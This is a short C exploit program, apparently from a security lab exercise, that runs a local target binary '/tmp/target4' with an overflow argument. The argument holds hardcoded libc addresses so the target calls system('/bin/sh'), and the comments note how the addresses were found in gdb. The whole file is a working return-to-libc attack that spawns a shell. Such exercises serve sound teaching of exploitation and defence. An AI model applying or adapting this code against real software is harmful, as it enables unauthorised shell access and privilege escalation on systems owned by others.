#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3]; 
  char *env[1];
  
  args[0] = TARGET;
  args[1] = "AAAAAAAA\xb0\x2d\xe4\xb7BBBB\x2b\x3b\xf6\xb7"; 
  args[2] = NULL;
  
  env[0] = NULL;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}

/*
print system
 0xb7e42db0 <__libc_system>

\xb0\x2d\xe4\xb7

print exit 
  0xb7e369e0 
  \xe0\x69\xe3\xb7

"/bin/sh"
find 0xb7e42db0, +999999999, "/bin/sh"
  0xb7f63b2b

\x2b\x3b\xf6\xb7

*/


